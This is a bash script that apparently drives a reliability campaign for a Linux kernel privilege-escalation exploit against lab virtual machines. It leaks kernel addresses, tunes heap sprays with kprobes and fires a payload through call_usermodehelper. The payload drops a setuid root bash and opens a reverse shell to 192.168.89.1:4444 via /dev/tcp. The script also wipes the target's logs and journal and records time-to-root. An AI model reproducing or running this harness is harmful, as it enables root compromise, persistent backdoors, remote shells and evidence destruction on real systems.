#!/bin/bash
# campaign.sh [trials] - reliability campaign for the 4-bucket combined fire.
# For each ANY-match boot: configure, measure F/L, ringone, start key/unix/af
# sprays on F, arm the stretch, start the stop-on-connect handler + storm,
# record root/time-to-root/target-survival.
set -u
LAB=$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)
N=${1:-8}
CSV=/tmp/campaign.csv
LOG=/tmp/campaign.log
: > "$CSV"
echo "trial,boot,seed,match,spray,src,F,L,S,root,alive5,alive20,suid,ttr_s" >> "$CSV"
T(){ ssh -i $LAB/lab/ssh/id_ed25519 -p 2101 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o ConnectionAttempts=1 -o ControlMaster=no -o ControlPath=none -o LogLevel=ERROR ubuntu@localhost "$@"; }
A(){ ssh -i $LAB/lab/ssh/id_ed25519 -p 2224 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o ConnectionAttempts=1 -o ControlMaster=no -o ControlPath=none -o LogLevel=ERROR ubuntu@localhost "$@"; }

# v_arm.sh: install the two F/L probes and start tracing.
cat > /tmp/v_arm.sh <<'EOF'
T=/sys/kernel/debug/tracing
echo 0 > $T/tracing_on
if [ -e $T/events/kprobes/enable ]; then echo 0 > $T/events/kprobes/enable; fi
echo > $T/kprobe_events 2>/dev/null
echo 4096 > $T/buffer_size_kb
echo 'p:freeopt inet_sock_destruct inet_opt=+784(%di):x64' >> $T/kprobe_events
echo 'inet_opt != 0' > $T/events/kprobes/freeopt/filter
echo 'p:rdopt2 ip_options_build opt=%si:x64 optlen=+8(%si):u8' >> $T/kprobe_events
echo 1 > $T/events/kprobes/enable
echo > $T/trace
echo 1 > $T/tracing_on
EOF
# v_clear.sh: stop tracing and empty the ring buffer.
cat > /tmp/v_clear.sh <<'EOF'
T=/sys/kernel/debug/tracing
echo 0 > $T/tracing_on; echo > $T/trace; echo 1 > $T/tracing_on
EOF
# v_parse.sh: dominant CPU of the freeopt / rdopt2 events -> F= / L=
cat > /tmp/v_parse.sh <<'EOF'
T=/sys/kernel/debug/tracing
echo 0 > $T/tracing_on
echo -n "F="
grep 'freeopt:' $T/trace | awk '{match($0,/\[[0-9]+\]/); c=substr($0,RSTART+1,RLENGTH-2); n[c]++} END{m=0;for(k in n)if(n[k]>m){m=n[k];b=k}print b}'
echo -n "L="
grep 'rdopt2:' $T/trace | awk '{match($0,/\[[0-9]+\]/); c=substr($0,RSTART+1,RLENGTH-2); n[c]++} END{m=0;for(k in n)if(n[k]>m){m=n[k];b=k}print b}'
echo
EOF
# recsyn_arm.sh / recsyn_parse.sh: which CPU receives the saved_syn spray (dport 9801)
cat > /tmp/recsyn_arm.sh <<'EOF'
T=/sys/kernel/debug/tracing
echo 0 > $T/tracing_on
if [ -e $T/events/kprobes/enable ]; then echo 0 > $T/events/kprobes/enable; fi
echo > $T/kprobe_events 2>/dev/null
echo 'p:recsyn tcp_reqsk_record_syn' >> $T/kprobe_events
echo 1 > $T/events/kprobes/enable
echo > $T/trace
echo 1 > $T/tracing_on
EOF
cat > /tmp/recsyn_parse.sh <<'EOF'
T=/sys/kernel/debug/tracing
echo 0 > $T/tracing_on
grep 'recsyn:' $T/trace | awk '{match($0,/\[[0-9]+\]/); c=substr($0,RSTART+1,RLENGTH-2); n[c]++} END{m=0;for(k in n)if(n[k]>m){m=n[k];b=k}print "cpu="b}'
EOF
# port-map probe: capture the peer source port of every saved_syn allocation
cat > /tmp/v_pmap_arm.sh <<'EOF'
T=/sys/kernel/debug/tracing
echo 0 > $T/tracing_on
if [ -e $T/events/kprobes/enable ]; then echo 0 > $T/events/kprobes/enable; fi
echo > $T/kprobe_events 2>/dev/null
echo 'p:rec2 tcp_reqsk_record_syn+0x77 p12=+12(%r13):u16' >> $T/kprobe_events
echo 1 > $T/events/kprobes/enable
echo > $T/trace
echo 1 > $T/tracing_on
EOF
cat > /tmp/v_pmap_dump.sh <<'EOF'
T=/sys/kernel/debug/tracing
echo 0 > $T/tracing_on
grep 'rec2:' $T/trace
EOF

trial=0
while [ "$trial" -lt "$N" ]; do
  rm -f /tmp/cve-any
  setsid nohup bash $LAB/lab/find-match-any.sh 300 > /tmp/find-match-any.log 2>&1 < /dev/null &
  for i in $(seq 1 360); do [ -f /tmp/cve-any ] && break; sleep 10; done
  if [ ! -f /tmp/cve-any ]; then echo "TRIAL $((trial+1)): no ANY match, stopping"; break; fi
  BOOT=$(cat /tmp/cve-any)
  MLINE=$(grep -a 'ANY:' /tmp/find-match-any.log | tail -1)
  SEED=$(echo "$MLINE" | sed -n 's/.*seed=\(0x[0-9a-f]*\).*/\1/p')
  # MATCH can be a comma-separated set (e.g. saved,key); it is quoted in the
  # CSV row below.
  MATCH=$(echo "$MLINE" | sed -n 's/.*ANY:\([^ ]*\).*/\1/p')
  echo "=== trial $((trial+1)) boot=$BOOT seed=$SEED match=$MATCH $(date +%T) ===" | tee -a "$LOG"

  T 'sudo find /var/log -type f -exec truncate -s 0 {} + 2>/dev/null; sudo rm -rf /var/log/journal/* /tmp/*.log /tmp/*.pcap 2>/dev/null; sudo mkdir -p /mnt/lab; sudo mount -t 9p -o trans=virtio,version=9p2000.L host0 /mnt/lab 2>/dev/null || true' >/dev/null 2>&1
  T 'sudo ip link set ens4 up; sudo ip addr replace 192.168.89.2/24 dev ens4; sudo sh /mnt/lab/lab/mq-config.sh ens4 >/dev/null 2>&1; sudo sh /mnt/lab/lab/start-listeners.sh >/dev/null 2>&1' >/dev/null 2>&1
  sed 's#/tmp/mptcp_token#/tmp/mptcp_token89#' "$LAB/exp/mpsetup_remote.py" | A 'cat > /tmp/mpsetup89.py'
  A 'sudo pkill -f "^python3 /tmp/mpsetup89.py" 2>/dev/null; sleep 1; sudo rm -f /tmp/mptcp_token89; sudo setsid nohup python3 /tmp/mpsetup89.py 192.168.89.2 9800 >/tmp/mpsetup89.log 2>&1 </dev/null &' >/dev/null 2>&1
  TOK=""
  for i in $(seq 1 15); do TOK=$(A 'sudo cat /tmp/mptcp_token89 2>/dev/null' | tr -d '\r\n'); [ -n "$TOK" ] && break; sleep 1; done
  if [ -z "$TOK" ]; then echo "  no token, skip"; trial=$((trial+1)); continue; fi

  T "cat > /tmp/v_arm.sh" < /tmp/v_arm.sh
  T "cat > /tmp/v_clear.sh" < /tmp/v_clear.sh
  T "cat > /tmp/v_parse.sh" < /tmp/v_parse.sh
  T "cat > /tmp/recsyn_arm.sh" < /tmp/recsyn_arm.sh
  T "cat > /tmp/recsyn_parse.sh" < /tmp/recsyn_parse.sh
  T "cat > /tmp/v_pmap_arm.sh" < /tmp/v_pmap_arm.sh
  T "cat > /tmp/v_pmap_dump.sh" < /tmp/v_pmap_dump.sh

  SRC=""; F=""; L=""
  for ip in 1 11 13 17 19 23 27; do
    T 'sudo bash /tmp/v_arm.sh' >/dev/null 2>&1
    T 'sudo bash /tmp/v_clear.sh' >/dev/null 2>&1
    A "sudo env MIXED_FRAG=1 MIX_K=6 MIX_PERIOD=300 FRAG_SYN=1 timeout 6 /mnt/lab/lab/bin/mpstorm3_mix 9800 $TOK 54502 2 32 1 0 10 192.168.89.$ip 30000000 192.168.89.2" >/dev/null 2>&1
    r=$(T 'sudo bash /tmp/v_parse.sh' 2>/dev/null)
    f=$(echo "$r" | sed -n 's/.*F=\([0-9]*\).*/\1/p'); l=$(echo "$r" | sed -n 's/.*L=\([0-9]*\).*/\1/p')
    if [ -n "$f" ] && [ -n "$l" ] && [ "$f" != "$l" ]; then SRC=$ip; F=$f; L=$l; break; fi
  done
  if [ -z "$SRC" ]; then echo "  no F!=L source, skip"; trial=$((trial+1)); continue; fi
  echo "  src=.$SRC F=$F L=$L token=$TOK"

  POB=$(T 'sudo python3 -' < "$LAB/lab/read_pob.py" | sed -n 's/^page_offset_base \(0x[0-9a-f]*\).*/\1/p')
  EX="0x$(T 'sudo grep " call_usermodehelper_exec$" /proc/kallsyms' | awk '{print $1}')"
  WK="0x$(T 'sudo grep " call_usermodehelper_exec_work$" /proc/kallsyms' | awk '{print $1}')"
  if [ -z "$POB" ] || [ "$EX" = "0x" ] || [ "$WK" = "0x" ]; then echo "  no addresses, skip"; trial=$((trial+1)); continue; fi
  cat > /tmp/v_ring.sh <<EOF
#!/bin/bash
rm -f /tmp/ringone.log
setsid nohup python3 /mnt/lab/lab/ringone.py $POB $EX $WK 'id > /tmp/PWNED; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; /usr/bin/fuser -k 9800/tcp 9801/tcp >/dev/null 2>&1; pkill -f "[k]eyspray"; pkill -f "[u]nixspray"; echo RCE_OK >> /tmp/PWNED; bash -i >& /dev/tcp/192.168.89.1/4444 0>&1' >/tmp/ringone.log 2>&1 </dev/null &
EOF
  T 'cat > /tmp/v_ring.sh' < /tmp/v_ring.sh
  T 'sudo bash /tmp/v_ring.sh' >/dev/null 2>&1
  sleep 4
  S=$(T 'sudo cat /tmp/ringone.log' | sed -n 's/.*S=\(0x[0-9a-f]*\).*/\1/p')
  if [ -z "$S" ]; then echo "  no ringone S, skip"; trial=$((trial+1)); continue; fi
  echo "  S=$S"

  # For a saved_syn match the reclaim comes from the storm's internal IPOPT4
  # spray; its target CPU is chosen by the RPS hash of the spray tuple, so
  # find a spray source IP that lands on the free CPU F.
  SPRAY_ENV=""; SPORTS=""; SPRAY_ARGS="1 0 1000000000"
  case ",$MATCH," in
  *,saved,*)
    # A half-open request's saved_syn dies ~1 RTT after the SYN (our kernel
    # RSTs the SYN-ACK).  Delay the attacker's egress 1 ms with netem so each
    # object lives ~1 ms, then aim a SET of spray ports at the free CPU F
    # (the RSS CPU is a function of src IP + ports, measured per boot).
    A 'sudo tc qdisc replace dev ens4 root handle 1: netem delay 1ms >/dev/null 2>&1; true' >/dev/null 2>&1
    ALL=""
    for base in 54200 54400 54600; do
      PL=$(seq -s, $base $((base + 63)))
      T 'sudo bash /tmp/v_pmap_arm.sh' >/dev/null 2>&1
      A "sudo env MIXED_FRAG=1 MIX_K=6 MIX_PERIOD=300 FRAG_SYN=1 SAVED_SYN_SPRAY=1 SPRAY_IPOPT4=1 SPRAY_DPORT=9801 SPRAY_SRC=192.168.89.1 SPRAY_PORTS=$PL timeout 6 /mnt/lab/lab/bin/mpstorm3_mix4 9800 $TOK 54502 2 20 1 $base 20 192.168.89.1 30000000 192.168.89.2" >/dev/null 2>&1
      p=$(T 'sudo bash /tmp/v_pmap_dump.sh' 2>/dev/null | python3 $LAB/lab/port_map.py $F 2>/dev/null)
      [ -n "$p" ] && ALL="$ALL,$p"
    done
    SPORTS=$(echo "$ALL" | tr ',' '\n' | awk 'NF' | sort -n | uniq | head -64 | paste -sd, -)
    if [ -n "$SPORTS" ]; then
      SPRAY_ENV="SAVED_SYN_SPRAY=1 SPRAY_IPOPT4=1 PAYLOAD_FRAG=$S SPRAY_DPORT=9801 SPRAY_SRC=192.168.89.1 SPRAY_PORTS=$SPORTS"
      SPRAY_ARGS="1 54200 20"
      echo "  saved spray: $(echo "$SPORTS" | tr ',' '\n' | wc -l) ports on cpu $F"
    else
      echo "  WARN no saved spray port maps to F=$F (firing anyway)"
    fi
    ;;
  esac

  T "setsid nohup /mnt/lab/exp/bin/keyspray $F $S 200 72 >/tmp/keyspray.log 2>&1 </dev/null &" >/dev/null 2>&1
  for k in 1 2 3 4; do T "setsid nohup /mnt/lab/exp/bin/unixspray $F $S 500 >/tmp/unix$k.log 2>&1 </dev/null &" >/dev/null 2>&1; done
  sleep 2

  T 'sudo bash -s' <<'EOF' >/dev/null 2>&1
T=/sys/kernel/debug/tracing
echo 0 > $T/tracing_on; if [ -e $T/events/kprobes/enable ]; then echo 0 > $T/events/kprobes/enable; fi; echo > $T/kprobe_events 2>/dev/null; if [ -e $T/events/kmem/kmalloc/enable ]; then echo 0 > $T/events/kmem/kmalloc/enable; fi
echo 4096 > $T/buffer_size_kb
for i in 5 9 13 18 23 27 34 38 45 50 54 58 61 68 71 74 78 83 90 97 101 104 111 114 117 120 124 132 135 141 144 150 158 164 171 179 186 192 199 210 218 225 231 277 281 285; do
  echo p:o$i ip_build_and_send_pkt+$i >> $T/kprobe_events 2>/dev/null && echo 0 > $T/events/kprobes/o$i/enable 2>/dev/null
done
echo 'p:rdopt2 ip_options_build opt=%si:x64 optlen=+8(%si):u8' >> $T/kprobe_events
echo 'optlen > 60' > $T/events/kprobes/rdopt2/filter
echo 1 > $T/events/kprobes/enable; echo > $T/trace; echo 1 > $T/tracing_on
EOF

  A 'sudo pkill -f "^python3 /mnt/lab/lab/shell_handler.py" 2>/dev/null; sleep 1; sudo rm -f /tmp/handler_campaign.log; sudo setsid nohup python3 /mnt/lab/lab/shell_handler.py >/tmp/handler_campaign.log 2>&1 </dev/null &' >/dev/null 2>&1
  sleep 1
  T0=$(date +%s)
  A "sudo setsid nohup env MIXED_FRAG=1 MIX_K=8 MIX_PERIOD=400 FRAG_SYN=1 $SPRAY_ENV timeout 180 /mnt/lab/lab/bin/mpstorm3_mix4 9800 $TOK 54502 180 64 $SPRAY_ARGS 192.168.89.$SRC 30000000 192.168.89.2 >/tmp/storm_campaign.log 2>&1 </dev/null &" >/dev/null 2>&1
  ROOT=0
  for i in $(seq 1 75); do
    if A 'sudo grep -q SHELL_OK /tmp/handler_campaign.log 2>/dev/null && echo y' | grep -q y; then ROOT=1; break; fi
    sleep 2
  done
  T1=$(date +%s); TTR=$((T1-T0))
  sleep 5
  A5=0; [ "$(T 'echo ALIVE' 2>/dev/null)" = "ALIVE" ] && A5=1
  sleep 15
  A20=0; SUID=0
  r20=$(T 'echo ALIVE; /tmp/rootbash -p -c id 2>/dev/null' 2>/dev/null)
  echo "$r20" | grep -q ALIVE && A20=1
  echo "$r20" | grep -q 'euid=0' && SUID=1
  ALIVE=$A20
  # Keep the match field quoted: a combined bucket can be "saved,key" and
  # would otherwise shift every following CSV column.
  echo "$((trial+1)),$BOOT,$SEED,\"$MATCH\",\"$SPRAY_ENV\",$SRC,$F,$L,$S,$ROOT,$A5,$A20,$SUID,$TTR" >> "$CSV"
  echo "  root=$ROOT alive5=$A5 alive20=$A20 suid=$SUID ttr=${TTR}s" | tee -a "$LOG"
  trial=$((trial+1))
done
echo "CAMPAIGN DONE" | tee -a "$LOG"
